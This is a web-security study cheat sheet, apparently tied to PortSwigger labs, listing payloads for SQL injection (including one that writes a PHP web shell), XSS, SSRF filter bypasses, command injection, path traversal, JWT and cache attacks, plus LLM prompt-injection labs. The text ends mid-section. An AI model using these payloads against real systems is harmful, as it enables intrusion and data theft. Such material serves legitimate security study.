---
title: Cheat Sheet
description: Cheat Sheet
last_update:
  date: "2025-12-16T08:00:00+08:00"
---

- Database
  - [SQLi](#sql-injection)
  - [NoSQLi](#nosql-injection)
- HTML, JS, Browser
  - [XSS](#xss)
  - [DOM](#dom-based-vulnerabilities)
  - [Prototype Pollution](#prototype-pollution)
  - [CSRF](#csrf)
  - [CORS](#cors)
  - [Websocket](#websocket)
- Server Side
  - [XXE](#xxe)
  - [SSRF](#ssrf)
  - [OS Command Injection](#os-command-injection)
  - [SSTI](#server-side-template-injection)
  - [Code Injection](#code-injection)
  - [Deserialization](#deserialization)
- API Testing
  - [Access Control](#access-control)
  - [API Testing](#api-testing)
  - [Business logic](#business-logic-vulnerabilities)
  - [GraphQL](#graphql-api)
  - [File Upload](#file-upload)
  - [LLM](#web-llm-attacks)
- Auth
  - [Authentication](#authentication)
  - [OAuth](#oauth)
  - [JWT](#jwt)
- Basic
  - [Path Traversal](#path-traversal)
  - [Information Disclosure](#information-disclosure)
- HTTP
  - [Host](#http-host-header-attacks)
  - [Web Cache Poisoning](#web-cache-poisoning)
  - [Web Cache Deception](#web-cache-deception)
  - [Race Conditions](#race-conditions)
  - [HTTP Request Smuggling](#http-request-smuggling)

```mermaid
flowchart TD
    A[Recon] --> B{nmap Port Scanning}
    A[Recon] --> C{Reverse IP,<br/>Securitytrails}
    A[Recon] --> D{web.archive.org}
    A[Recon] --> E{Zoomeye,<br/>Shodan,<br/>Google Dork}
```

## SQL Injection

### Cheat Sheet

https://portswigger.net/web-security/sql-injection/cheat-sheet

### Recon

- `'`
- `' OR 1=1#`
- `' OR '1'='1`
- `" OR "1"="1"-- 123`
- `" OR "1"="1" LIMIT 1#`

### UNION Based

- `' UNION SELECT NULL#`
- `' UNION SELECT NULL FROM dual--`
- `' UNION SELECT 1, 'string'#`
  - [Real World Example 1](https://zeroday.hitcon.org/vulnerability/ZD-2025-00972)
- `' UNION SELECT '<?php $host = "localhost"; system($_GET["cmd"]); ?>' INTO OUTFILE 'D:/xampp/htdocs/shell.php'`
  - [Real World Example 1](https://zeroday.hitcon.org/vulnerability/ZD-2025-01107)

### Stacked Queries

- `';SELECT 1/name FROM sysobjects WHERE xtype LIKE 'U' AND name BETWEEN 'A' AND 'AZ'`
  - [Real World Example 1](https://zeroday.hitcon.org/vulnerability/ZD-2025-01101)

### Error Based

- `'`
- `' OR CAST((SELECT username FROM users LIMIT 1) AS boolean)--`
- `ExtractValue` and `CONCAT`
  - [Real World Example 1](https://zeroday.hitcon.org/vulnerability/ZD-2025-00978)
  - [Real World Example 2](https://zeroday.hitcon.org/vulnerability/ZD-2025-00980)
  - [Real World Example 3](https://zeroday.hitcon.org/vulnerability/ZD-2025-01026)
- `UpdateXML` and `CONCAT`
  - [Real World Example 1](https://zeroday.hitcon.org/vulnerability/ZD-2025-01032)
- `' AND 1 = CONVERT(int,@@version)--123`
  - [Real World Example 1](https://zeroday.hitcon.org/vulnerability/ZD-2025-01030)
  - [Real World Example 2](https://zeroday.hitcon.org/vulnerability/ZD-2025-01031)
- `' AND 1 = CONVERT(int,(SELECT table_name FROM information_schema.tables FOR XML PATH('')))--`
  - [Real World Example 1](https://zeroday.hitcon.org/vulnerability/ZD-2025-01095)
- `';SELECT 1/name FROM sysobjects WHERE xtype LIKE 'U' AND name BETWEEN 'A' AND 'AZ'`
  - [Real World Example 1](https://zeroday.hitcon.org/vulnerability/ZD-2025-01101)

### Boolean Based

- `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20) = 'a`

### Blind

- [time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet#time-delays)
- [DNS Lookup](https://portswigger.net/web-security/sql-injection/cheat-sheet#dns-lookup)

### Bypass Skill

- white space not allowed => `/**/`, `%20`, `+`, `\t`
- [`(`, `)`, `=`, `>`, `<`, `.` not allowed](https://zeroday.hitcon.org/vulnerability/ZD-2025-01101)
- CRLF Injection: `\r\n`, `%0d%0a`
- `Char()`

## NoSQL injection

- [`'||'1'=='1`](../port-swigger/nosql-injection.md#lab-detecting-nosql-injection)
- [`%00` as terminator](../port-swigger/nosql-injection.md#mongodb-註解)
- operator injection
  - [Document](../port-swigger/nosql-injection.md#nosql-operator-injection)
  - [Inject](../port-swigger/nosql-injection.md#injecting-operators-in-mongodb)
  - [extract data](../port-swigger/nosql-injection.md#extracting-field-names)
  - [Exfiltrating data using operators](../port-swigger/nosql-injection.md#exfiltrating-data-using-operators)
  - [1: bypass authentication](../port-swigger/nosql-injection.md#lab-exploiting-nosql-operator-injection-to-bypass-authentication)
  - [2: extract unknown fields](../port-swigger/nosql-injection.md#lab-exploiting-nosql-operator-injection-to-extract-unknown-fields)
- Boolean Based
  - [extract data via `' && '1' === '1`](../port-swigger/nosql-injection.md#exploiting-syntax-injection-to-extract-data)
  - [Identifying field names](../port-swigger/nosql-injection.md#identifying-field-names)

## XSS

### Basic Payloads

- `<script>alert(1)`
- `<script>alert(1)</script>`
- `<SCRIpt>alert(1)</scriPT>`
- `"/><script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `javascript:alert(1)`
- `123" autofocus onfocus="alert(0)" data-type="456`
- `<di onfocus="alert(document.cookie)" tabindex="0" autofocus></di>`
- `';alert(1);var a = '3`
- `<svg><animateTransform onbegin="alert(1)" attributeName="transform" dur="0.1s" /></svg>`
- `'accesskey='x'onclick='alert(1)`
- `<svg><a><animate attributeName="href" values="javascript:alert(1)" /><text x=20 y=20>Click me</text></a></svg>`
- [`(`, `)`, `{`, `}` and `;` are blocked](../port-swigger/cross-site-scripting.md#lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked)

### AngularJS

- `{{ constructor.constructor('alert("XSS")')() }}`
- [AngularJS 1](../port-swigger/cross-site-scripting.md#lab-reflected-xss-with-angularjs-sandbox-escape-without-strings)
- [AngularJS 2](../port-swigger/cross-site-scripting.md#lab-reflected-xss-with-angularjs-sandbox-escape-and-csp)

<!-- ### Clickjacking -->

## DOM-based vulnerabilities

<!-- ### Recon -->

- [DOM clobbering via `window.vulnerableKey`](../port-swigger/dom-based-vulnerabilities.md#lab-exploiting-dom-clobbering-to-enable-xss)
- [Clobbering DOM attributes](../port-swigger/dom-based-vulnerabilities.md#lab-clobbering-dom-attributes-to-bypass-html-filters)

## Prototype Pollution

### Concept

- [sink, gadget](../port-swigger/prototype-pollution.md#lab-client-side-prototype-pollution-in-third-party-libraries)

### Tools

- [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution)

### Recon

- [`script.src = data:text/javascript,alert(1)`](../port-swigger/prototype-pollution.md#lab-dom-xss-via-client-side-prototype-pollution)
- [`eval`](../port-swigger/prototype-pollution.md#lab-dom-xss-via-an-alternative-prototype-pollution-vector)
- [sanitize non-recursively => `____proto__proto__`](../port-swigger/prototype-pollution.md#lab-client-side-prototype-pollution-via-flawed-sanitization)
- [Detecting server-side prototype pollution via polluted property reflection](../port-swigger/prototype-pollution.md#detecting-server-side-prototype-pollution-via-polluted-property-reflection)
- SSTI
  - [`{__proto__:{isAdmin:true}}`](../port-swigger/prototype-pollution.md#lab-privilege-escalation-via-server-side-prototype-pollution)
  - [`content-type: "application/json; charset=utf-7`](../port-swigger/prototype-pollution.md#lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)
  - [`constructor.prototype`](../port-swigger/prototype-pollution.md#lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)
  - [RCE via `execArgv`](../port-swigger/prototype-pollution.md#lab-remote-code-execution-via-server-side-prototype-pollution)

## CSRF

### Prerequisite

- Simple Request (HTML `<form>`, `<img>`, `<iframe>` 可發出的請求)

### Recon

- CSRF Token Bypass
  - [GET Method Bypass CSRF Token](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-token-validation-depends-on-request-method)
  - [Strip `csrf: string`](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-token-validation-depends-on-token-being-present)
  - [CSRF token is not tied to user session](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-token-is-not-tied-to-user-session)
- CSRF Token + CRLF Injection Bypass
  - [Control Set-Cookie via CSRF Injection](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-token-is-tied-to-non-session-cookie)
  - [Double Submit](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-token-is-duplicated-in-cookie)
- SameSite Bypass
  - [SameSite Lax bypass via method override](../port-swigger/cross-site-requesy-forgery.md#lab-samesite-lax-bypass-via-method-override)
  - [SameSite Strict bypass via client-side redirect](../port-swigger/cross-site-requesy-forgery.md#lab-samesite-strict-bypass-via-client-side-redirect)
  - [SameSite Strict bypass via 30x redirect](../port-swigger/cross-site-requesy-forgery.md#lab-samesite-strict-bypass-via-client-side-redirect)
  - [SameSite Strict bypass via sibling domain Reflected XSS](../port-swigger/cross-site-requesy-forgery.md#lab-samesite-strict-bypass-via-sibling-domain)
  - [SameSite Lax bypass via 2 mins cookie](../port-swigger/cross-site-requesy-forgery.md#lab-samesite-lax-bypass-via-cookie-refresh)
- Referer Bypass
  - [Strip Referer Header using `<meta name="referrer" content="never" />`](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-referer-validation-depends-on-header-being-present)
  - [Broken Referer validation using `referer.contains('vulnerable-website.com')`](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-with-broken-referer-validation)

## CORS

<!-- ### Recon -->

- [Origin Reflection](../port-swigger/cors.md#lab-cors-vulnerability-with-basic-origin-reflection)
- [null Origin Bypass](../port-swigger/cors.md#lab-cors-vulnerability-with-trusted-null-origin)

## WebSocket

<!-- ### Recon -->

- XSS
  - [1](../port-swigger/websocket.md#lab-manipulating-websocket-messages-to-exploit-vulnerabilities)
  - [2](../port-swigger/websocket.md#lab-manipulating-the-websocket-handshake-to-exploit-vulnerabilities)
- [Cross-site WebSocket hijacking](../port-swigger/websocket.md#lab-cross-site-websocket-hijacking)

## XXE

<!-- ### Recon -->

- [XXE leads to LFI](../port-swigger/xxe.md#lab-exploiting-xinclude-to-retrieve-files)
- [XXE leads to SSRF](../port-swigger/xxe.md#lab-exploiting-xxe-to-perform-ssrf-attacks)
- [XInclude leads to LFI](../port-swigger/xxe.md#lab-exploiting-xinclude-to-retrieve-files)
- [XXE via SVG Image Upload](../port-swigger/xxe.md#lab-exploiting-xxe-via-image-file-upload)
- [Blind XXE via External DTD](../port-swigger/xxe.md#lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
- [XXE via Error Msg](../port-swigger/xxe.md#lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages)

## SSRF

### Recon

- [SSRF to localhost](../port-swigger/ssrf.md#lab-basic-ssrf-against-the-local-server)
- [Bypass 黑名單](../port-swigger/ssrf.md#lab-ssrf-with-blacklist-based-input-filter)
  - Decimal: `http://2130706433`
  - Octal: `http://017700000001`
  - Short form: `http://127.1`
  - Full URL encoding:`http://%31%32%37%2e%30%2e%30%2e%31`
  - Hex: `http://0x7f.0.0.1`
  - Partial URL encoding: `http://%3127.0.0.1`
- [Bypass 白名單](../port-swigger/ssrf.md#lab-ssrf-with-whitelist-based-input-filter)
  - URL Encode Fragment: `http://localhost%23@vulnerable-website.com`
  - Double URL Encode With username:password: `http://localhost:80%2523@vulnerable-website.com`
- [SSRF via Open Redirect](../port-swigger/ssrf.md#lab-ssrf-with-filter-bypass-via-open-redirection-vulnerability)
- Flawed Logic via `String.startsWith`:
  - `http://vulnerable-website.com.hackingwithpentesterlab.link`
  - `https://whatever-hostname.hackingwithpentesterlab.link`

### Tools

- URL Encode All Characters

```ts
function encodeSingleStringToURIComponent(str) {
  return "%" + str.charCodeAt(0).toString(16);
}
```

- [String to Hex](https://www.hextostring.com/string-to-hex)

## OS command injection

### Useful commands

https://portswigger.net/web-security/os-command-injection#useful-commands

### Recon

- `1 & echo whoami &`
- `& ping -c 10 127.0.0.1 &`
- `& whoami > /var/www/images/whoami.txt &`
- [Ways of injecting OS commands](https://portswigger.net/web-security/os-command-injection#ways-of-injecting-os-commands)

## Server-side template injection

<!-- ### Recon -->

- `${{<%[%'"}}%\`
- [Ruby ERB](../port-swigger/server-side-template-injection.md#lab-basic-server-side-template-injection)
- [Python tornado](../port-swigger/server-side-template-injection.md#lab-basic-server-side-template-injection-code-context)
- [Apache FreeMarker](../port-swigger/server-side-template-injection.md#lab-server-side-template-injection-using-documentation)
- [Handlebars.js](../port-swigger/server-side-template-injection.md#lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
- [Python Django](../port-swigger/server-side-template-injection.md#lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
- [Apache FreeMarker (EXPERT)](../port-swigger/server-side-template-injection.md#lab-server-side-template-injection-in-a-sandboxed-environment)
- [PHP Twig (EXPERT)](../port-swigger/server-side-template-injection.md#lab-server-side-template-injection-with-a-custom-exploit)

## Code Injection

<!-- ### Recon -->

- inject `'`, `"`, `}`, `;`, `$`, `#`, `;ls;`, `|ls`
- string concat: `.`, `+`
- comment out: `#`, `//`, `;//`
- execute code:

```
eval('ls')
exec('ls')
system('ls')
`uname`
```

## Deserialization

### Tools

- [PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)
- [Java, Maven, ysoserial](../port-swigger/insecure-deserialization.md#lab-exploiting-java-deserialization-with-apache-commons)

### Recon

- [PHP 7.x `0 == "string"`](../port-swigger/insecure-deserialization.md#lab-modifying-serialized-data-types)
- Source Code Access + PHP
  - [1](../port-swigger/insecure-deserialization.md#lab-arbitrary-object-injection-in-php)
  - [2](../port-swigger/insecure-deserialization.md#lab-developing-a-custom-gadget-chain-for-php-deserialization)
  - [3 (EXPERT)](../port-swigger/insecure-deserialization.md#lab-using-phar-deserialization-to-deploy-a-custom-gadget-chain)
- [Exploiting Java deserialization with Apache Commons](../port-swigger/insecure-deserialization.md#lab-exploiting-java-deserialization-with-apache-commons)
- [Universal Deserialisation Gadget for Ruby 2.x-3.x](../port-swigger/insecure-deserialization.md#lab-exploiting-ruby-deserialization-using-a-documented-gadget-chain)
- [Source Code Access + Java](../port-swigger/insecure-deserialization.md#lab-developing-a-custom-gadget-chain-for-java-deserialization)

## Access control

<!-- ### Recon -->

- [`/robots.txt`](../port-swigger/access-control.md#lab-unprotected-admin-functionality)
- [Reuqest Param](../port-swigger/access-control.md#lab-user-role-controlled-by-request-parameter)
  - `Cookie: admin=true`
  - `?role=1`
  - `roleid=2`
- [`X-Original-URL`](../port-swigger/access-control.md#lab-url-based-access-control-can-be-circumvented)
- [Casing, File Extension, Trailing Slash](../port-swigger/access-control.md#lab-user-id-controlled-by-request-parameter)
- [30x With Sensitive Data](../port-swigger/access-control.md#lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)
- [IDOR](../port-swigger/access-control.md#lab-user-id-controlled-by-request-parameter-with-password-disclosure)
  - `?id=administrator`
  - `?userId=1`
- [Referer Based](../port-swigger/access-control.md#lab-referer-based-access-control)

## API testing

<!-- ### Tools

- [JS Link Finder](https://portswigger.net/bappstore/0e61c786db0c4ac787a08c4516d52ccf)

### Recon -->

- [Find `/api` Document](../port-swigger/api-testing.md#lab-exploiting-an-api-endpoint-using-documentation)
- [Try Different HTTP Request Methods](../port-swigger/api-testing.md#lab-finding-and-exploiting-an-unused-api-endpoint)
- [Mass assignment](../port-swigger/api-testing.md#lab-exploiting-a-mass-assignment-vulnerability)
- server-side parameter pollution in a query string
  - [How to construct](../port-swigger/api-testing.md#server-side-parameter-pollution-in-the-query-string)
  - [1](../port-swigger/api-testing.md#lab-exploiting-server-side-parameter-pollution-in-a-query-string)
- [server-side parameter pollution in a REST URL (EXPERT)](../port-swigger/api-testing.md#lab-exploiting-server-side-parameter-pollution-in-a-rest-url)

## Business logic vulnerabilities

- [加入購物車 price](../port-swigger/business-logic-vulnerabilities.md#lab-excessive-trust-in-client-side-controls)
- [加入購物車 qty 負數](../port-swigger/business-logic-vulnerabilities.md#lab-high-level-logic-vulnerability)
- [加入購物車 qty Integer overflow](../port-swigger/business-logic-vulnerabilities.md#lab-low-level-logic-flaw)
- [padding@vulnerable-website.com.attacker-website.com](../port-swigger/business-logic-vulnerabilities.md#lab-inconsistent-handling-of-exceptional-input)
- [privilege escalation via update userInfo](../port-swigger/business-logic-vulnerabilities.md#lab-inconsistent-security-controls)
- Insufficient workflow validation
  - [1](../port-swigger/business-logic-vulnerabilities.md#lab-insufficient-workflow-validation)
  - [2](../port-swigger/business-logic-vulnerabilities.md#lab-authentication-bypass-via-flawed-state-machine)
- [兩張折價券交替使用](../port-swigger/business-logic-vulnerabilities.md#lab-flawed-enforcement-of-business-rules)
- [encryption oracle](../port-swigger/business-logic-vulnerabilities.md#lab-authentication-bypass-via-encryption-oracle)
- [email address parsing discrepancies (EXPERT)](../port-swigger/business-logic-vulnerabilities.md#lab-bypassing-access-controls-using-email-address-parsing-discrepancies)

## GraphQL API

- [Common endpoint names](../port-swigger/graphql.md#common-endpoint-names)
- Running a full introspection query
  - [Document](../port-swigger/graphql.md#running-a-full-introspection-query)
  - [1](../port-swigger/graphql.md#lab-accessing-private-graphql-posts)
  - [2](../port-swigger/graphql.md#lab-accidental-exposure-of-private-graphql-fields)
- Bypassing GraphQL introspection defenses
  - [Document](../port-swigger/graphql.md#bypassing-graphql-introspection-defenses)
  - [1](../port-swigger/graphql.md#lab-finding-a-hidden-graphql-endpoint)
- [Multi query](../port-swigger/graphql.md#lab-bypassing-graphql-brute-force-protections)

## File upload

### Tools

- [exiftool](https://exiftool.org/)

### Recon

- Web Shell Upload
  - [Content-Type bypass](../port-swigger/file-upload-vulnerabilities.md#lab-web-shell-upload-via-content-type-restriction-bypass)
  - [Path traversal](../port-swigger/file-upload-vulnerabilities.md#lab-web-shell-upload-via-path-traversal)
  - [`.htaccess`](../port-swigger/file-upload-vulnerabilities.md#lab-web-shell-upload-via-extension-blacklist-bypass)
  - [obfuscated file extension](../port-swigger/file-upload-vulnerabilities.md#lab-web-shell-upload-via-obfuscated-file-extension)
  - [polyglot](../port-swigger/file-upload-vulnerabilities.md#lab-remote-code-execution-via-polyglot-web-shell-upload)
  - [race condition (EXPERT)](../port-swigger/file-upload-vulnerabilities.md#lab-web-shell-upload-via-race-condition)

## Web LLM attacks

- [請問你有哪些 API 可以使用？](../port-swigger/llm-attacks.md#lab-exploiting-llm-apis-with-excessive-agency)
- [Indirect prompt injection](../port-swigger/llm-attacks.md#lab-indirect-prompt-injection)
- [insecure output handling](../port-swigger/llm-attacks.md#lab-exploiting-insecure-output-handling-in-llms)

## Authentication

<!-- ### Recon -->

- Username/Password enumeration
  - [via different responses](../port-swigger/authentication.md#lab-username-enumeration-via-different-responses)
  - [via subtly different responses](../port-swigger/authentication.md#lab-username-enumeration-via-subtly-different-responses)
  - [via response timing](../port-swigger/authentication.md#lab-username-enumeration-via-response-timing)
  - `X-Forwarded-For`
  - [Success Login can reset counter](../port-swigger/authentication.md#lab-broken-brute-force-protection-ip-block)
  - [via account lock](../port-swigger/authentication.md#lab-username-enumeration-via-account-lock)
  - [multiple credentials per request](../port-swigger/authentication.md#lab-broken-brute-force-protection-multiple-credentials-per-request)
  - [via stay-logged-in cookie](../port-swigger/authentication.md#lab-brute-forcing-a-stay-logged-in-cookie)
  - [via password change](../port-swigger/authentication.md#lab-password-brute-force-via-password-change)
- [Brute-Force verification code](../port-swigger/authentication.md#lab-2fa-broken-logic)
- [Password reset using victim's username](../port-swigger/authentication.md#lab-password-reset-broken-logic)
- [Password reset poison via `X-Forward-Host`](../port-swigger/authentication.md#lab-password-reset-poisoning-via-middleware)
- Case insensitive: "admin" vs "Admin"
- Space allowed: "admin" vs "admin "

## OAuth

<!-- ### Recon -->

- [token not bind to user](../port-swigger/oauth.md#lab-authentication-bypass-via-oauth-implicit-flow)
- [profile linking CSRF (no state param)](../port-swigger/oauth.md#lab-forced-oauth-profile-linking)
- [OAuth account hijacking via redirect_uri](../port-swigger/oauth.md#lab-oauth-account-hijacking-via-redirect_uri)
- [OAuth account hijacking via Open Redirect](../port-swigger/oauth.md#lab-stealing-oauth-access-tokens-via-an-open-redirect)
- [SSRF via OpenID dynamic client registration](../port-swigger/oauth.md#lab-ssrf-via-openid-dynamic-client-registration)

## JWT

### Tools

[hashcat](../port-swigger/jwt.md#brute-forcing-secret-keys-using-hashcat)

### Recon

- [unverified signature](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-unverified-signature)
- ["alg":"none" or "alg": "None"](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-flawed-signature-verification)
- Brute-forcing secret keys using hashcat
  - [Document](../port-swigger/jwt.md#brute-forcing-secret-keys-using-hashcat)
  - [1](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-weak-signing-key)
- header injection
  - [Document](../port-swigger/jwt.md#jwt-header-parameter-injections)
  - [jwk](../port-swigger/jwt.md#injecting-self-signed-jwts-via-the-jwk-parameter)
  - [jwk Lab](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-jwk-header-injection)
  - [jku](../port-swigger/jwt.md#injecting-self-signed-jwts-via-the-jku-parameter)
  - [jku Lab](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-jku-header-injection)
  - [kid](../port-swigger/jwt.md#injecting-self-signed-jwts-via-the-kid-parameter)
  - [kid Lab](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-kid-header-path-traversal)
- algorithm confusion
  - [1 (EXPERT)](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-algorithm-confusion)
  - [2 (EXPERT)](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key)

## Path traversal

<!-- ### Payloads -->

- [Basic](../port-swigger/path-traversal.md#lab-file-path-traversal-simple-case): `../../../etc/passwd`
- [Strip non-recursively](../port-swigger/path-traversal.md#lab-file-path-traversal-traversal-sequences-stripped-non-recursively)
- [URL Encode](../port-swigger/path-traversal.md#lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode)
  - Partial URL Encode: `..%2F..%2F..%2Fetc%2Fpasswd`
  - URL Encode: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
  - Double URL Encode: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`
- [Start Path](../port-swigger/path-traversal.md#lab-file-path-traversal-validation-of-start-of-path): `/var/www/images/../../../etc/passwd`
- [Null Byte](../port-swigger/path-traversal.md#lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass): `../../../etc/passwd%00.jpg`
- `/etc/./passwd`
- `/etc/../etc/passwd`
- `/etc/../ETC/passwd`
- `/pentesterlab;pentesterlab`
- Windows: `non-exist-dir/../../../file.txt`

## Information disclosure

<!-- ### Recon -->

- Fingerprint (Response Headers, 404 Page, Malformed Request)
- [Error Message](../port-swigger/information-disclosure.md#lab-information-disclosure-in-error-messages)
- [Debug Page](../port-swigger/information-disclosure.md#lab-information-disclosure-on-debug-page)
- [`/robots.txt`](../port-swigger/information-disclosure.md#lab-source-code-disclosure-via-backup-files)
- [HTTP TRACE](../port-swigger/information-disclosure.md#lab-authentication-bypass-via-information-disclosure)
- HTML comment, JS Links, API & Secret Key, Source Map
- ffuf, nmap http-enum
<!-- ## Essential skills -->

## HTTP Host header attacks

- Supply an arbitrary Host header
  - [Port](../port-swigger/http-host-header-attacks.md#port)
  - [Subdomain](../port-swigger/http-host-header-attacks.md#subdomain)
  - [Double Host headers](../port-swigger/http-host-header-attacks.md#double-host-headers)
  - [Absolute URL](../port-swigger/http-host-header-attacks.md#absolute-url-in-http-request-start-line)
  - [Indent](../port-swigger/http-host-header-attacks.md#indent)
  - [Custom Header](../port-swigger/http-host-header-attacks.md#x-forwarded-host-x-host-x-forwarded-server-x-http-host-override-forwarded)
  - [SQLi Payload](../port-swigger/http-host-header-attacks.md#exploiting-classic-server-side-vulnerabilities)
  - [malformed request line](../port-swigger/http-host-header-attacks.md#ssrf-via-a-malformed-request-line)
- [Web Cache Posioning](../port-swigger/http-host-header-attacks.md#lab-web-cache-poisoning-via-ambiguous-requests)
- [authentication bypass](../port-swigger/http-host-header-attacks.md#lab-host-header-authentication-bypass)
- [virtual host brute-forcing](../port-swigger/http-host-header-attacks.md#accessing-internal-websites-with-virtual-host-brute-forcing)
- Routing-based SSRF
  - [Document](../port-swigger/http-host-header-attacks.md#routing-based-ssrf)
  - [1](../port-swigger/http-host-header-attacks.md#lab-routing-based-ssrf)
  - [2](../port-swigger/http-host-header-attacks.md#lab-ssrf-via-flawed-request-parsing)
- Connection state attacks
  - [Document](../port-swigger/http-host-header-attacks.md#connection-state-attacks)
  - [1](../port-swigger/http-host-header-attacks.md#lab-host-validation-bypass-via-connection-state-attack)
- SSRF via a malformed request line
  - [Document](../port-swigger/http-host-header-attacks.md#ssrf-via-a-malformed-request-line)
  - [1](../port-swigger/http-host-header-attacks.md)
- Password reset poisoning
  - [1](../port-swigger/http-host-header-attacks.md#lab-basic-password-reset-poisoning)
  - [2](../port-swigger/http-host-header-attacks.md#lab-password-reset-poisoning-via-middleware)

## Web cache poisoning

- unkeyed input
  - [Header: `X-Forwarded-Host`](../port-swigger/web-cache-poisoning.md#lab-web-cache-poisoning-with-an-unkeyed-header)
  - [Header: `X-Forwarded-Host` + DOM Based XSS (EXPERT)](../port-swigger/web-cache-poisoning.md#lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria)
  - [Cookie](../port-swigger/web-cache-poisoning.md#lab-web-cache-poisoning-with-an-unkeyed-cookie)
  - [Headers: `X-Forwarded-Host` + `X-Forwarded-Scheme`](../port-swigger/web-cache-poisoning.md#lab-web-cache-poisoning-with-multiple-headers)
  - [Headers: `X-host` + `Vary: User-Agent`](../port-swigger/web-cache-poisoning.md#lab-targeted-web-cache-poisoning-using-an-unknown-header)
  - [Headers: `X-Forwarded-Host` + `X-Original-URL` (EXPERT)](../port-swigger/web-cache-poisoning.md#lab-combining-web-cache-poisoning-vulnerabilities)
  - [QueryString](../port-swigger/web-cache-poisoning.md#lab-web-cache-poisoning-via-an-unkeyed-query-string)
  - [utm_content](../port-swigger/web-cache-poisoning.md#lab-web-cache-poisoning-via-an-unkeyed-query-parameter)
  - [GET request with body](../port-swigger/web-cache-poisoning.md#lab-web-cache-poisoning-via-a-fat-get-request)
- [`Pragma: akamai-x-get-cache-key`, `Pragma: x-get-cache-key`](../port-swigger/web-cache-poisoning.md#akamai-based-websites)
- [Path normalization](../port-swigger/web-cache-poisoning.md#path-normalization)
- Parameter cloaking
  - [?a=1?b=2](../port-swigger/web-cache-poisoning.md#cache-parameter-cloaking)
  - [?a=1;b=2](../port-swigger/web-cache-poisoning.md#lab-parameter-cloaking)
- URL normalization
  - [Document](../port-swigger/web-cache-poisoning.md#normalized-cache-keys)
  - [1](../port-swigger/web-cache-poisoning.md#lab-url-normalization)
- Cache Key Injection
  - [Document](../port-swigger/web-cache-poisoning.md#cache-key-injection)
  - [1 (EXPERT)](../port-swigger/web-cache-poisoning.md#lab-cache-key-injection)
- [Internal cache poisoning (EXPERT)](../port-swigger/web-cache-poisoning.md#lab-internal-cache-poisoning)

## Web cache deception

- Path mapping discrepancies: `/user/1` vs `/user/1/style.css`
  - [Document](../port-swigger/web-cache-deception.md#path-mapping-discrepancies)
  - [1](../port-swigger/web-cache-deception.md#lab-exploiting-path-mapping-for-web-cache-deception)
- Delimiter discrepancies: `/profile` vs `/profile;foo.css`
  - [Document](../port-swigger/web-cache-deception.md#delimiter-discrepancies)
  - [1](../port-swigger/web-cache-deception.md#lab-exploiting-path-delimiters-for-web-cache-deception)
- [Delimiter decoding discrepancies: `/profile` vs `/profile%23style.css`](../port-swigger/web-cache-deception.md#delimiter-decoding-discrepancies)
- Normalization discrepancies
  - [Document](../port-swigger/web-cache-deception.md#normalization-discrepancies)
  - [by the origin server](../port-swigger/web-cache-deception.md#detecting-normalization-by-the-origin-server)
  - [1](../port-swigger/web-cache-deception.md#lab-exploiting-origin-server-normalization-for-web-cache-deception)
  - [by the cache server (1)](../port-swigger/web-cache-deception.md#detecting-normalization-by-the-cache-server)
  - [by the cache server (2)](../port-swigger/web-cache-deception.md#exploiting-normalization-by-the-cache-server)
  - [1](../port-swigger/web-cache-deception.md#lab-exploiting-cache-server-normalization-for-web-cache-deception)
- [exact-match cache rules (EXPERT)](../port-swigger/web-cache-deception.md#lab-exploiting-exact-match-cache-rules-for-web-cache-deception)

## Race conditions

- TOCTOU
  - [CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)
  - [1](../port-swigger/race-conditions.md#lab-limit-overrun-race-conditions)
  - [2](../port-swigger/race-conditions.md#lab-bypassing-rate-limits-via-race-conditions)
- [加車 + 結帳](../port-swigger/race-conditions.md#lab-multi-endpoint-race-conditions)
- [todo-yus](../port-swigger/race-conditions.md#lab-single-endpoint-race-conditions)
- [Partial construction (EXPERT)](../port-swigger/race-conditions.md#lab-partial-construction-race-conditions)
- [time-sensitive](../port-swigger/race-conditions.md#lab-exploiting-time-sensitive-vulnerabilities)

## HTTP request smuggling

### Note

- Use CL.TE First
<!-- - [Real World Situation](../port-swigger/http-request-smuggling.md#真實世界情況) -->

### Recon

1. H2.CL

Attack

<div className="httpRawRequest">
  <div className="blue">POST / HTTP/2</div>
  <div className="blue">Host: vulnerable-website.com</div>
  <div className="blue">Content-Length: 0</div>
  <div className="blue"></div>
  <div className="orange">GET /resources HTTP/1.1</div>
  <div className="orange">Host: vulnerable-website.com</div>
  <div className="orange">Content-Length: 46</div>
  <div className="orange"></div>
  <div className="orange"></div>
</div>

Normal

<div className="httpRawRequest">
